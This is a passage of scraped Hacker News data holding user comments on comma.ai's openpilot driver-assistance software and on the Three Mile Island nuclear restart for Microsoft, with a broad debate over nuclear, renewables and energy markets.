downgrades all around. It's slower (rclpy is catastrophically bad), more demanding (CPU usage is through the roof to do DDS packet conversions), less reliable (the RMWs are a mess), less compatible (armhf is kill). The QoS might count as an improvement for edge cases where you need UDP for point clouds, but what it mostly does on a day to day basis is create a shit ton of failure cases where there's QoS incompatibility between topics and things just refuse to connect. It's lot more hassle for no real gain. reply causal 1 hour agorootparentConfig generally feels more complex though, since there isn't a central parameter server anymore. The colcon build system also just feels more complex now, which I thought was already impressively complex with catkin. reply moffkalast 1 hour agorootparentYep it takes super long to get parameters from all nodes cause you need to query each one instead of the DDS caching it or something. And yeah I forgot, there's the added annoying bit where you can't build custom messages/services with python packages, only ament_cmake can do it so you often need metapackages for no practical reason. And the whole deal with the default build mode being \"copy all\" so you need to rebuild every single time if you don't symlink, and even that often doesn't work. The defaults are all around impressively terrible, adding extra pitfalls in places where there were none in ROS 1. reply ModernMech 57 minutes agorootparentprevIt does a lot of things better but it also does a lot of things worse and also doesn't fix a lot of the real problems with ROS as a system. reply ModernMech 59 minutes agorootparentprevROS2 has been pushed a the successor to ROS for like a decade, and people still prefer ROS for various reasons. So yeah like Python 2/3 kinda. reply punnerud 5 hours agoparentprevIsn’t the software for training end-to-end NN to be used in automation? Just a first version that it’s used for cars, and they have been using it for their own robot. So the claim still stands? reply rkagerer 1 hour agoparentprevThe docs (https://docs.comma.ai/) begin with a more honest - and useful - description: openpilot is an open source driver assistance system. reply tamimio 4 hours agoparentprevYeah came to say the same, I thought a new big player is in the market. It looks great nonetheless. reply akgrd 7 hours agoprevThis seems to be a mix of C++ and Python, including a script called \"realtime.py\" (oxymoron?). So am I now exposed to other people using Python on the roads to operate heavy machinery? reply AyyEye 3 hours agoparentThe interface between the openpilot and the car is a standalone device (the panda) that provides and enforces the safety model. All code is written in C to automotive safety standards including ISO26262, ISO11270, ISO15622, and MISRA-C. 100% line coverage for all safety unt tests. They also run pretty extensive tests (regression, unit, hardware/software-in-the-loop, mutation, and vehicle specific) on every commit and have actual hardware devices continually running real routes looking for regressions. https://github.com/commaai/openpilot?tab=readme-ov-file#safe... https://github.com/commaai/panda?tab=readme-ov-file#code-rig... reply bobsomers 1 hour agorootparentJust so we're all clear here, there is a lot of gobbly-gook in this answer which is either off target or irrelevant. > a standalone device (the panda) that provides and enforces the safety model What the actual safety model is that is being enforced is far more important here. The safety model could be \"there is no safety guarantee whatsoever\" and this sentence would still be true. > All code is written in C to automotive safety standards including ISO26262, ISO11270, ISO15622, and MISRA-C. 26262 says practically nothing about software, what you really want is 21448. And 11270 and 15622 are super low targets for the amount of control authority available here. MISRA-C is mostly a waste of time when it comes to safety. It gives software developers the warm blanket of having a checklist they can tick items off of, but does little to prevent unsafe systems from being built. Programmers have gotten pretty good about at least using tests and other analysis tools to make sure they're not doing the wildly stupid things that MISRA tries to prevent. > 100% line coverage for all safety unt tests 100% like coverage is also rather trivial to achieve and doesn't say much. Branch coverage would be better, but being able to make some claims about state space coverage with exposure numbers would be what I'm expecting here. reply traverseda 6 hours agoparentprevWell NIST says don't use C++ either: https://www.nist.gov/itl/ssd/software-quality-group/safer-la... So what, you want everything written in RUST on a linux kernel with hard real-time patches? It uses machine vision anyway, which has no hard guarantees at all. The software it uses to detect lanes or cars is probabilistic by it's very nature. Python does pretty good at soft real time if you manage your own event loop and disable the garbage collector, and you're a lot less likely to get \"crash the entire stack\" style memory allocation bugs. Sure, GO or RUST would be better, I think CPP could be worse if handled inexpertly. reply thisismyswamp 5 hours agorootparentexception handling in GO makes it unusable IMO reply tmarkman 6 hours agorootparentprevPython has segfault issues, surprising exceptions and version incompatibility. I've been using Linux/BSD for over a decade now. No C or C++ application has ever crashed, I cannot say the same about Python applications. Outright segfaults are rare but happen. Rogue exceptions are much more common and could basically have the same detrimental effect on a self-driving system as a segfault. And let's not talk about logic bugs due to version incompatibility and the obsessive rewriting of those who took control over CPython. reply traverseda 6 hours agorootparentAhh, you've been running some grad students first python project as if it was a serious project like curl with 20 years of history, and expecting it to have the same quality. But you've somehow avoided the tons of grad-student CPP programs with similar quality issues, or the broken code pushed by companies like crowdstrike or IBM. Fair enough, your experience may vary. I'd suggest not judging the language by the standards of some hobbyist code that just so happened to end up on github. I've had tons of bugs in c/cpp programs over the years, some more critical than others. I've seen a lot of shitty and unreliable python code, and a lot of good and mature C/CPP projects. I've also seen really bad security issues and crashes with bad C code, heartbleed, crowdstrike, etc. For what it's worth I've never had youtube-dl hard crash on me, and I could argue that it's a more complicated problem to solve than what curl is solving. In an apples-to-apples comparison I think it does pretty well. No matter what language you use for this you're going to be relying on an AI vision model with no hard guarantees. reply bee_rider 5 hours agorootparentActually Python was insufficient for the sort of grad student bugs I wanted to write, I was able to just wrap everything up in giant try blocks and then, except: print(“Something happened”, i) (Where I might be an index. Or an element). Fortran is able to generate better bugs, because it has allocate/free. reply plrandk 5 hours agorootparentprevYou have much more control over a pure C/C++ application because it does not involve the Python runtime. Crowdstrike etc. are exploits that don't really matter here: If you are on the CAN bus it's game over already. That said, I'm pretty sure CPython has exploits, too. They'll be harder to find and trigger though. reply traverseda 4 hours agorootparentSure, runtimes exist and have engineering trade-offs. You avoid a whole class of memory related bugs but you lose a lot of control over memory allocation. You can do soft real-time as long as you manually manage the garbage collection and accept that there will be some (bounded) jitter on memory allocations. The first rule of the tautology club is the first rule of the tautology club. Things have trade-offs. Python removes (or at least significantly reduces) a whole class of bugs that appear when using lower-level languages, that's part of why it's a good glue language. reply enragedcacti 3 hours agoparentprev> So am I now exposed to other people using Python on the roads to operate heavy machinery? yes in the sense that python is running the ML models and deciding what the vehicle should do, but it is heavily bounded in what it can do by the safety model which is implemented in bare-metal MISRA C running on the microcontroller that interfaces between openpilot and the CAN bus (panda). It enforces things like accel/braking limits and steering rate limits along with consistency checks, heartbeats, vehicle status checks, etc. Level 2 self driving is already only a best effort system so if python caused an issue it would just fall back to the safety model on the panda and ultimately the driver to operate the vehicle safely. reply jedberg 4 hours agoparentprevSort of. It operates after your vehicle safety systems, so yes, python is controlling the car to an extent, but only within the limits of the built in safety systems. reply KeplerBoy 7 hours agoparentprevIs this legal in the US? reply guyfromfargo 5 hours agoprev [–] I’m surprised to see so many people disliking Open Pilot on HackerNews. I have one of these, and it’s a total game changer on long trips. I drove from Texas to California using my Comma 3 and I didn’t have to overtake it a single time on the interstate. Sure you have to actively be alert your entire drive, but it’s still significantly better than actually doing the work of driving. reply 1shooner 2 hours agoparent [–] I've only driven a driver-assist system once and kind of hated it, but I've always assumed that the mental work of remaining attentive as a passive participant would actually be more mentally taxing than just driving. It seems like you're inevitably going to lose attention. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "openpilot is an operating system for enhancing driver assistance in over 275 supported cars, requiring a comma 3/3X device and a compatible car harness.",
      "The software follows ISO26262 safety guidelines, undergoes rigorous testing, and is released under the MIT license, emphasizing its alpha quality and research purposes only.",
      "User data, including road-facing camera footage and other sensor logs, is uploaded by default to improve the system, with options to disable data collection and opt-in for driver-facing camera logging."
    ],
    "commentSummary": [
      "Openpilot, developed by Comma.ai, is an advanced driver assistance system (ADAS) that offers hands-off driving assistance, enhancing driver confidence and alertness on long trips.",
      "The system is compatible with over 275 car models and integrates with existing car sensors, providing features like lane keeping and distance assist, though it is not a fully self-driving solution.",
      "Despite minimal venture capital funding and a small team, Comma.ai has created a profitable product, with Openpilot being open-source and licensed under MIT, ensuring transparency and community support."
    ],
    "points": 137,
    "commentCount": 98,
    "retryCount": 0,
    "time": 1726823940
  },
  {
    "id": 41601443,
    "title": "Three Mile Island nuclear plant restart in Microsoft AI power deal",
    "originLink": "https://www.reuters.com/markets/deals/constellation-inks-power-supply-deal-with-microsoft-2024-09-20/",
    "originBody": "reuters.com#cmsg{animation: A 1.5s;}@keyframes A{0%{opacity:0;}99%{opacity:0;}100%{opacity:1;}}Please enable JS and disable any ad blockervar dd={'rt':'c','cid':'AHrlqAAAAAMAilATWWgabhAArMjHrA==','hsh':'2013457ADA70C67D6A4123E0A76873','t':'bv','s':43909,'e':'e7f0c7e255a00895e91058b5999ac0b3998a5fe1feff6b6128fb61b9254313c5','host':'geo.captcha-delivery.com'}",
    "commentLink": "https://news.ycombinator.com/item?id=41601443",
    "commentBody": "Three Mile Island nuclear plant restart in Microsoft AI power deal (reuters.com)128 points by rcdemski 6 hours agohidepastfavorite206 comments atomic128 5 hours agoNo battery farm can protect a solar/wind grid from an arbitrarily extended period of bad weather. If you have N days of battery storage and the sun doesn't shine for N+1 days, you're in trouble. Nuclear fission is the answer. Today there are 440 nuclear reactors operating in 32 countries. Nuclear fission power plants are expensive to build but once built the plant can last 50 years (maybe 80 years, maybe more) and the uranium fuel is very cheap, perhaps 10% of the cost of running the plant. This is in stark contrast to natural gas, where the plant is less expensive to build, but then fuel costs rapidly accumulate. The fossil fuel is the dominant cost of running the plant. And natural gas is a poor choice if you care about greenhouse emissions. Sam Altman owns a stake in Oklo, a small modular reactor company. Bill Gates has a huge stake in his TerraPower nuclear reactor company. Amazon recently purchased a \"nuclear adjacent\" data center from Talen Energy. Oracle announced that it is designing data centers with small modular nuclear reactors (https://news.ycombinator.com/item?id=41505514). In China, 5 reactors are being built every year. 11 more were announced a few weeks ago. The United Arab Emirates (land of oil and sun) now gets 25% of its grid power from the Barakah nuclear power plant (four 1.4 GW reactors, a total of 5.6 GW). Nuclear fission will play an important role in the future of grid energy. But you don't hear about it in the mainstream news yet. And many people (Germany, Spain, I'm looking at you) still fear it. Often these people are afraid of nuclear waste, despite it being extremely tiny and safely contained (https://en.wikipedia.org/wiki/Dry_cask_storage). Education will fix this. Nuclear fission is safe, clean, secure, and reliable. reply riedel 0 minutes agoparentThree mile island already hit jackpot once in the statistics game and it didn't only go offline for a few days. And it is true that fuel cost are not the driving factor for fision. I am all in, if power companies really have to pay for all security and lifecycle costs upfront. reply giantg2 3 minutes agoparentprev\"No battery farm can protect a solar/wind grid from an arbitrarily extended period of bad weather.\" Generally agree. However, I want to point out that it could defined be possible if designed the right way. You can use \"batteries\" like pumped hydro, which could protect against longer duration outages. Bonus is that when there's no sun, there's usually rain, which one would hope would also offset some of the draining of the water. reply jakewins 5 hours agoparentprev> No battery farm can protect a solar/wind grid from an arbitrarily extended period of bad weather. I don’t understand why wind solar is subject to absolutes devoid of probability - “what if the sun and wind stop simultaneously for 2 months?” We know the probability that the sun stops shining and the wind stops blowing for N days, we can calculate it from historical data. You can absolutely build solar+wind+storage systems that deliver 24/7/365 energy with many nines SLAs, on the real earth with real statistics on weather. reply bloopernova 5 hours agorootparentPlus if it's not sunny/windy in one part of the country, it may well be very sunny or windy in other parts of the country. We have a whole freaking energy grid! This isn't aimed at you, but more at the people dismissing the utility of solar and wind power. reply burningChrome 5 minutes agorootparentCan't we do both? This is what happened to Germany. They tried going 100% renewables and then had Russia take up the slack for the rest of what they needed. Then they realized they had a massive shortfall and then was leaning far too much on Russia to take up the slack. As someone else pointed out, geopolitics always weighs heavy in energy production. Just like in Germany's case where they relied too heavy on Russia for the shortfall of renewables, then Russia invaded Ukraine and Russia used their energy production as leverage to essentially blackmail Germany into not going along with UN sanctions against them. However we need to get to total energy independence, I'm all for, and this whole idea it has to be one or the other only lengthens the process of getting there. In the mean time, it puts us in a precarious position to be involved with countries and regime's that don't like us and will never have our best interests in mind. reply greenthrow 2 minutes agorootparentGermany did not make a real effort at truly going 100% renewable. There are other European countries doing it for real and having wild success. RhysU 2 hours agorootparentprevGeopolitics is largely determined by who controls energy resources. We've seen, over and over, how borders between energy producers and consumers are inevitably messy. Nuclear can be built most places. Sun and wind cannot. reply greenthrow 1 minute agorootparentBullshit. Sun and wind can be built everywhere. They're just more effective some places than others. But they are cheaper than nuclear everywhere. anigbrowl 13 minutes agorootparentprevGeopolitics and nuclear power are not always such a great combination - consider the Russian occupation of the nuclear power plant in Ukraine. I'm not against nuclear power in general, but saying it's a great hedge against political risks involved with wind and solar is quite a stretch. reply piva00 1 hour agorootparentprev> Nuclear can be built most places. Nukes require lots of cooling, needing access to large amounts of water from water bodies, that's definitely not \"most places\" by definition. reply Braini 54 minutes agorootparentDry cooling towers do exist (though I am aware they also have disadvantages). reply doublepg23 1 hour agorootparentprevThat’s most places humans live isn’t it? reply piva00 1 hour agorootparentIf you ever done a tour on a nuclear facility you'd hear about how careful they need to be managing water temperatures in their discharge pools, you don't want a nuke frying off all wildlife on the rivers and/or lakes nearby. You don't want to create massive ponds of still water for cooling, and you definitely don't want to have a nuke potentially discharging contaminated water near population centres (in case something goes wrong and the discharge needs to happen). This limits a lot nuclear facilities placement. reply nradov 55 minutes agorootparentprevThat doesn't work very well for the Western North America. After sunset there is nowhere to obtain much solar or wind power. We're not going to build a transmission cable to Hawaii. reply closewith 5 hours agorootparentprev> You can absolutely build solar+wind+storage systems that deliver 24/7/365 energy with many nines SLAs, on the real earth with real statistics on weather. Once you start adding nines, nuclear starts to be become attractive again. Hence these deals. reply pjc50 5 hours agorootparent> Once you start adding nines, nuclear starts to be become attractive again. Only if you ignore reliability issues with nuclear, such as France having to take a lot of reactors offline at the same time to check for cracks. The comparison has to be fair. reply mpweiher 4 hours agorootparentNot the same scenario. First, France came through this just fine. Second, the could have kept those plants operating and taken a more piecemeal approach to fixing the cracks. They shouldn't have, and didn't, because you really want that triple or quadruple redundancy in your cooling systems, but they could have if push had come to shove, the plants were still operational. But since there was plenty of capacity available, they could afford to take those plants offline and do the checks and repairs all at once. Intermittent renewables afford you no such optionality. If the sun don't shine, the sun don't shine. If the wind don't blow, the wind don't blow. reply closewith 4 hours agorootparentprevWell, that's a false dichotomy, because no-one's (at least no-one reasonable and in good faith) is suggesting shifting the grid entirely to nuclear. Instead, a diverse set of generation sources is ideal, including solar, wind, nuclear and hydro. reply pjc50 4 hours agorootparentDunno, all the nuclear advocates seem to contrast it with wind/solar, which are also much cheaper and quicker capital investments. reply closewith 2 hours agorootparentWell, the point of this thread is that's only true until a sufficient level of availability is required, and then nuclear (and fossil thermal plants) all of a sudden become a viable option again. reply venj 4 hours agorootparentprevThis event happened in 2022. this is the only year since 1995 where nuclear production fell below 300TWh (278TWh in 2022 vs 360 in 2021 and 320 in 2023). These cracks are not the only factor for the poor performance on nuclear in 2022 : several reactors had to do their 10-year maintenance (grand carénage), which had been delayed because of the pandemic. It's hard to extrapolate reliability issues from an event that happened once in 30 years. reply wakawaka28 3 hours agorootparentprevWhy did they have to be checked all at once? That sounds like a design or regulation problem. reply RandomLensman 5 hours agorootparentprevPractically, a lot of nuclear power plants can be down at the same time for maintenance etc., so you need to overbuild quite a bit there as well then reply mpweiher 4 hours agorootparentNo. Nuclear power plants are super reliable and available. German und US plants had/have capacity factors of well over 90%, and the downtimes are scheduled. The \"overbuild\" is minimal. reply RandomLensman 4 hours agorootparentFrance in 2022 didn't have a lot of capacity down at the same time? Availability was at 40% of maximum capacity for about a month at it's lowest. How these things will be managed in the real world matters, too, not just how it could play out hypothetically. reply jakewins 3 hours agorootparentprev> and the downtimes are scheduled. Dayjob is in energy market algo trading and DER ancillary services in EU, and I can tell you with confidence this is far from true. And when the nukes trip for safety reasons - which happens multiple times per year - that’s a GW that just dropped off the grid from one second to the next. For me, I much prefer the reliability of wind and solar; never seen a correlated failure, and we know their production pattern days in advance. reply dylan604 4 hours agorootparentprevHopefully you have multiple reactor designs so that if an issue with one is found, you don't stop all reactors just reactors of the same design. reply christina97 5 hours agorootparentprevIt’s literally just that having a solar+wind grid that can survive 3 days of bad weather costs 6x as much as a grid that can survive normal day to day. reply Suppafly 2 hours agorootparentprev>“what if the sun and wind stop simultaneously for 2 months?” Anything alive after that wouldn't be human and wouldn't be worried about electricity. reply w4 3 hours agorootparentprevNuclear isn’t a replacement for solar and wind. It’s additive. Build all of it. reply phil21 5 hours agorootparentprev> We know the probability that the sun stops shining and the wind stops blowing for N days, we can calculate it from historical data. Exactly. And everyone is putting their heads in the sand over this calculation. Seasonal energy storage is simply not a problem we have even begun to solve yet. We know the numbers, we're just not talking about them. reply BobaFloutist 1 hour agorootparentprevSomehow you never hear these people say \"What if the nuclear fuel supply chain becomes compromised for an arbitrarily extended period.\" reply Filligree 1 hour agorootparentBecause it’s reasonably cheap to buy two decades of fuel in advance, and it won’t take up much space. If such a thing were a concern, then people would do precisely that. If it were still a problem towards the end of that period, then you can in fact extract uranium from seawater. reply lm28469 2 hours agorootparentprevThe problem is that you need to plan for the absolute worst case, once in a century, scenario and size your batteries accordingly. Same reason why almost no one goes 100% solar at home deep in the south/north because you'd need 20x your needed capacity in batteries to account for that once in a decade bleak winter week reply wahern 1 hour agorootparentI don't mean to be cynical, but manifestly this isn't necessary. It's why widespread power outages remain a thing even in rich, highly industrialized countries. American Gulf Coast utilities don't spend astronomical sums on distribution infrastructure to ensure 100% uptime through hurricanes; entire regions end up going hours if not days without power on a regular basis. Likewise, Texas doesn't maintain enough generation and robust infrastructure to make it through every cold snap unscathed. People say one thing--\"we require 100% uptime\"--but do another--\"but I'm only willing to pay a fraction of the price it would take to achieve that, and then I'll complain bitterly during the inevitable power outages.\" I'm all for nuclear, but let's be honest about how real-world infrastructure truly works. And, yes, I believe this means safety claims of Gen 4+ nuclear are off, just as they were for prior gen plants. Through motivated accounting people arrive at the numbers that are demanded, but knowingly or not the actual risk of an incident will be greater, as it manifestly always has been. At the same time our real risk tolerance is much greater than we claim, and this will eventually be born out in the power markets, whether through greater nuclear, less reliable power, or some other state of affairs. reply cesarb 1 hour agorootparentprev> you need to plan for the absolute worst case, once in a century, scenario and size your batteries accordingly. For a once-in-a-century situation, you can have alternatives other than batteries. For instance, backup diesel generators; any extra CO2 emitted by them in that situation would be insignificant when spread over a hundred years. And once you're planning for once-in-a-century events, you need backup generators anyway, since you can have failures other than just cloudy windless weather. reply gregw2 3 hours agorootparentprevYou make very legitimate point which I appreciate; I agree than in aggregate weather forecasting should be fairly reliable as regards sun and wind. Question though... do we understand the tail risk from volcanos on solar outputs, either natural-occurring eruptions or maliciously-triggered ones? reply lossolo 1 hour agorootparentprevNuclear plants often operate at 90%+ capacity factors, while solar can range from 10-25% depending on location. So you might need 4-9 times more solar capacity to match total energy output. So depending on the region, you might need 4-9 gigawatts of solar capacity with a higher amount of battery storage to match 1 GW nuclear output. This is because you need to account for winter vs summer, for bad weather etc. Maybe it will take a lot more space and cost more to build than restarting a nuclear plant for 1.6 billion. reply himinlomax 5 hours agorootparentprev> I don’t understand why wind solar is subject to absolutes devoid of probability - “what if the sun and wind stop simultaneously for 2 months?” Something close to that happens almost every year in Europe. Last year there was nearly 3 weeks in winter where there was very little wind across the continent ( Many of these things you mention only exist because profit seekers developed and distributed them! You mean governments signaled the creation of a market by printing and lending free money to build those systems ? reply qwytw 4 hours agorootparentprevResidential users make up ~38% of the electricity market in the US. Where do you suggest the rest of the users should get power from? And how would that work exactly in reality? Even of the government had to ensure that everyone has access to affordable electricity they'd still have to buy it from someone which fundamentally doesn't change anything. reply exe34 4 hours agorootparentthey could use renewables? reply qwytw 4 hours agorootparentRight, and? Will that also be socialized? Or will they have to build their own grid? reply wonderwonder 4 hours agorootparentprevWho pays for it? If everybody gets all of the above for free, then why would they ever work and contribute to covering the cost of these free for everyone services? Once a large number of people stop working, who actually works to grow the food? Who builds the houses? Communism does not work. reply ericjmorey 3 hours agorootparentEveryone pays for it. It's interesting that you bring up a large number of people no longer growing food as if that's not the current reality. What do all those people do now that they don't have to work for food? reply mpweiher 4 hours agorootparentprevWho said anything about \"free\"? reply nickpp 5 hours agorootparentprevWithout profit there is no reason anybody will provide those. Countries that tried socializing food - starved. Capitalism is the only one that brought plenty - because there is an incentive to do so. reply baq 4 hours agorootparentProfit is… not fake, but fiat. Energy and clean water are real. With collapsing demographics the current economic system will fall over anyway, either due to inflation or defaults, so maybe it’s a good time to start thinking about how to separate utilities from money. reply qwytw 4 hours agorootparent> how to separate utilities from money Forced labour? Central planning? Requisition? How exactly would that work? Somebody still needs to build and operate those power plants. Also commercial and industrial users consume >60% of all electricity in the US, should they also be subsidized? Or subsidize residential users? reply baq 4 hours agorootparentIf I had answers, I wouldn't be saying that it's a good time to think about that. But you shouldn't assume that things will just continue on as they were in the past hundred years. Boomers are retiring now, when the busters start going into retirement it's going to be a huge mess. Inflation is how democracies die. reply bayindirh 4 hours agorootparentprevCapitalism is the extraordinary belief that the nastiest of men, for the nastiest of reasons, will somehow work for the benefit of us all. -- John Maynard Keynes. I think he's onto something as I see the lengths Boing, Intel, FAANG, et. al going to benefit us all everyday... reply qwytw 4 hours agorootparentWell they did overall, throughout their entire existence, didn't they? reply bayindirh 4 hours agorootparentThere are so few corporations which build things to better the world and make money in the process. 99% of the corporations build things to earn money. Their wares sometimes do no harm, but it's the exception. In many cases, the desire for money, not the need, is the driving force behind the technology. See n startups which are discussed here and categorized as \"this is better as X. they're just trying to earn money with no real benefit to anyone\". Did Exxon hide their global warming research to benefit humanity? Of course not. Did Tetra Ethyl Lead added to gasoline instead of Ethanol, just because it was better? No because it was patentable and ethanol was not. Did WV created \"better\" diesel engines to benefit the humanity? No the engines were only \"better\" for their bottom line and problematic for every one. Did DuPont hid the effects of forever chemicals because it was beneficial/harmless to the nature? On the contrary. Companies do whatever they can without breaking laws (or bending them with money) to earn more money. The products we get are side effects of it. I like this take about current (Generative) AI hype: The true purpose of AI is to allow wealth to access skill without allowing skill to access wealth. -- jeffowski (at Twitter/X) reply qwytw 4 hours agorootparent> Their wares sometimes do no harm, but it's the exception. I disagree with that to a very extreme degree (also it's a very silly thing to say unless you don't see any value in computers, smartphones, planes, automobiles, washing machines, fridges and other appliances). The things you listed are generally the exceptions. Also the question is whether society/people benefited from VW, Exxon, DuPont etc. to such an extent that it outweighed all of those things? Of course it's relative, if we value access to cheap and effective transportation, synthetic clothing, various plastic products etc. more than we care about all the negative externalities that's what we get... It's all down to incentives, corporations are inherently neither good nor evil. > to earn more money. The products we get are side effects of it. I agree that's true on the whole. But that's why humans do anything at all (replace money with other tangible or intangible benefits). Absolute altruism doesn't scale and isn't in any way sustainable. reply nancybelowzero 4 hours agorootparentprevIt certainly brought plenty to some people, didn't it? Other people still get nothing. reply nickpp 3 hours agorootparentFewer and fewer get nothing. Capitalism raised billions out of poverty and continues to do so, in every place it is allowed to work. reply exprez135 4 hours agorootparentprevThe problem you describe seems to be one targeted by the TerraPower project in Wyoming. It plans to operate at 100% capacity at all times (345 MWe), but makes itself more akin to other renewables by incorporating energy storage into its design. It is supposed to be able to increase capacity to 150% (500 MWe), allowing it to respond to energy scarcity. But it can also respond to energy abundance by storing excess production in molten salt storage tanks. reply JumpCrisscross 3 hours agorootparentprev> When you get plentiful and nearly free solar energy at certain times of the year, the utilization of your nuclear power plant will drop In the short run, sure. In the long run, cheap power builds its own demand. A country that commits to a certain amount of nuclear baseload, even if run at a loss in the short term, is injecting a very real industrial subsidy into its system. (The way to ensure you don’t get a dog is to subsidise long-term loans for private borrowers. They still need to make a profit someday. But you reduce the time value of money for them.) The investment doesn’t make sense for a non-nuclear power. But if you’re already producing nuclear waste at scale for your military, it’s a little silly to pretend you’re safer without a civilian reactor in the middle of a desert while all manner of subs and ships patrol your coast. reply mpweiher 4 hours agorootparentprevThere is nothing inherent or natural about that scenario, it is all due to the failure to properly design electricity markets. See also: the 2001 California electricity crisis. https://en.wikipedia.org/wiki/2000–2001_California_electrici... See also: Enron https://en.wikipedia.org/wiki/2000–2001_California_electrici... If we have designed our markets to price cheap, reliable electricity out of the market and instead prefer expensive unreliable electricity, we've really f*ed up. reply phil21 5 hours agorootparentprevEasily solved via sane energy policy. Of course politics will likely make this impossible in the US. In a rational environment you run your nuclear at 100% 24x7. The cost of the fuel is not material running at 10% vs. 100%. Letting parasitic intermittent power sources screw this up is simply financial engineering by largely bad actors. At least currently. Then you use intermittent power sources to provide your peak loads during the day, and any excess you ideally start putting into storage - whatever that may be. If you have effectively free marginal power during certain peak times, I'm positive industry will find a way to turn that into money. I still have hope sanity returns to the energy discussion, but it likely won't happen in the US during my lifetime. The cost of solar and wind is entirely politics - the storage cost is literally never considered when reading articles on the subject. The hidden costs are likely 10x or so what the marginal cost per kwh everyone loves to spew. Lots of folks getting massively rich off this disinformation so there is huge inertia behind ignoring it - even from very smart people that should absolutely know better after a few hours of reading on the subject. Just look at many of the posts here at HN. The environmental costs of methane (natural gas) are simply not being considered. The methane leaks into the environment are underestimated by at least 10x if not much, much, more. Pivoting from nuclear and to natural gas has been an utter environmental disaster. reply kaliqt 5 hours agorootparentprevThat's not how this works though, energy abundance means industrial abundance, more energy availability (for cheap) would simply mean that demand will scale to meet the output. The only time it won't scale to meet output is if the price stays high, but if the nuclear energy is already on the grid and has elastic pricing, the rest will take care of itself. reply akamaka 5 hours agorootparentBut the price of energy can be negative, so a new nuclear plant might never pay off its cost, even if it provides the public benefit of cheap electricity. reply mpweiher 4 hours agorootparentI'll take \"What is market failure?\" for 400, Alex. reply quickthrowman 5 hours agorootparentprevDid you read the post you’re responding to? > That's not how this works though, energy abundance means industrial abundance, more energy availability (for cheap) would simply mean that demand will scale to meet the output. If the price of electricity is negative, people will build stuff like aluminum smelters and desalination plants to use the excess energy, and electricity will cost money again. https://en.m.wikipedia.org/wiki/Jevons_paradox > In economics, the Jevons paradox (/ˈdʒɛvənz/; sometimes Jevons effect) occurs when technological progress increases the efficiency with which a resource is used (reducing the amount necessary for any one use), but the falling cost of use induces increases in demand enough that resource use is increased, rather than reduced. reply akamaka 4 hours agorootparent> people will build stuff like aluminum smelters and desalination plants to use the excess energy, and electricity will cost money again. But will electricity cost enough to justify the huge upfront cost of nuclear plants? If we have the wealth to build capital-intensive projects that are marginally cost effective, it might be easier to build smelters and desalination plants that only run at 40% capacity, when the sun is out. reply berkes 4 hours agoparentprevNo. An energy mix is the answer. One of the parts that is mixed in, can be nuclear. Probably should be. But always a small part of the mix. Nuclear is slow: slow to power up, slow to adjust to demand or supply from others in the mix. And extremely slow to build. Nuclear plants that already run, often take days, some even weeks to adjust significant: so if on monday the wind stops blowing, on tuesday it gets cloudy, and on tuesday afternoon everyone needs to charge their EV or fire up the AC, it'll often take until next week friday before a nuclear plant can deliver this. Modern plants are faster, and theres many \"hacks\" where energy is blown out (wasted) for short peaks down, or where there's always 10% wasted for short peaks up. So nuclear needs innovation. But most of all, needs to be \"just a piece of the puzzle\" and never the only piece. Nuclear fission, and other of this \"innovation\" isn't there. That's the other slow part of nuclear. Even if its production ready today, that plant won't run for another decade, often 20+ years (except china, which tells you the reason why it's so rediculous slow: NIMBY, regulations, democracy) So, sorry, aside from all the other (fictive) problems with nuclear (waste, risk etc), nuclear has a serious problem of being just too damn slow to solve *todays* energy crisis on its own. Edit: Source, I've interned in power plants. A comparable coal plant, took one and a half month to power up from zero to producing electricity: which happened every 5 years for revision and three months to power down. It could adjust 10% in a few hours, but everything over 30% needed week(s) of planning ahead. I made those plannings. reply Ancapistani 2 hours agorootparent> One of the parts that is mixed in, can be nuclear. Probably should be. But always a small part of the mix. Nuclear is slow: slow to power up, slow to adjust to demand or supply from others in the mix. And extremely slow to build. All of those things, to me, mean that it should be a large part of the mix. Nuclear should be the backbone of our energy production, and should be sufficient to supply our baseline needs. That said, in places where hydro or geothermal are practical, those should be used in preference to nuclear. They're cheaper, more reliable, and just better in almost every way. Solar, wind, tidal, wave action, and so on should be what we build on top of that baseline. They should be cheaper to build and operate, but far less consistent. If you want to train a huge LLM, or smelt metals, or do anything that's energy-intensive but not very time-sensitive, you schedule those loads during times where energy production exceeds existing demand. ... and you know when that happens by pricing energy based on availability. Electricity should be cheapest when we have more than we need, and more expensive when the inconsistent sources listed above aren't producing. In other words, market forces are sufficient to make this happen. In fact, one of the cool things about solar and wind in particular is that they are so aggressively cyclical that it's possible that energy prices could actually go negative - not often, or regularly, but possible. That opens the door to all kinds of use cases that would otherwise never be profitable, and using those types of technologies often leads to efficiency gains that can eventually make them more efficient than the current alternatives. reply nradov 40 minutes agorootparentScheduling loads based on energy spot price tends to wreck the economics of manufacturing. If you have to shut down when energy prices spike then you're still paying fixed expenses for PP&E plus at least some labor. It's tough to finance that. reply jgtrosh 4 hours agorootparentprev> > Nuclear fission will play an important role in the future of grid energy. > No. > An energy mix is the answer. Maybe that “No.” was unnecessary. reply berkes 4 hours agorootparentMaybe. Probably, if \"future\" means 50+ years, so two generations in future. But not if it means \"future\" in even overlapping the current nuclear plants that are EOL, 10, 20 even 30 years. Because to replace those nuclear EOL with other nuclear, we'd need to start building plants in 2014, 2015 (which we didn't). The next best time may be now, but \"We\", at least in Europe aren't doing that either, and AFAIK neither in the US. TBC: I'm not saying \"it won't work, so stop chasing it\" on contrary. But shoehorning \"fission\" into a discussion of a current energy crisis, what this article is about, isn't relevant. Such tech isn't for today, tomorrow. Not even for when your kids grow, up, but at most for your grandkids when they are working - horizons. reply otherme123 4 hours agoparentprevSpaniard here: we have zero gas and zero uranium nationally sourced, yet thanks to solar, wind and hydro, our energy grid is among the best in the world. We are at 20% nuclear, above global average, and above USA or UK, no need to install more. Get down your \"education\" horse and solve your own problems first, asuming you are from the USA. In terms of energy we are good, thank you, and need no lessons from the USA. reply sheepybloke 2 hours agorootparentSpain also has a hugely different energy market than the United States. Spain is around 5% of the size of the US, being closer to a state in our context. Different states have different climates, making them more aligned with different energy sources. It doesn't make sense to compare the US and Spain in this context. > We are at 20% nuclear, Doesn't this prove the parent comment's point, that the best mix of energy is renewables supplemented by a base of nuclear power? > Get down your \"education\" horse and solve your own problems first, asuming you are from the USA This feels unnecessary. Spain has done an amazing job building an energy base, let's talk about how we can export to different countries and climates instead of putting people down. reply Panzer04 5 hours agoparentprevBut not cheap. Gas peakers are cheap compared to nuclear, and arguably much more appropriate for the foreseeable future when it comes to making up for renewable energy's inconsistency problems. I mostly disagree with your initial assertion as well. A 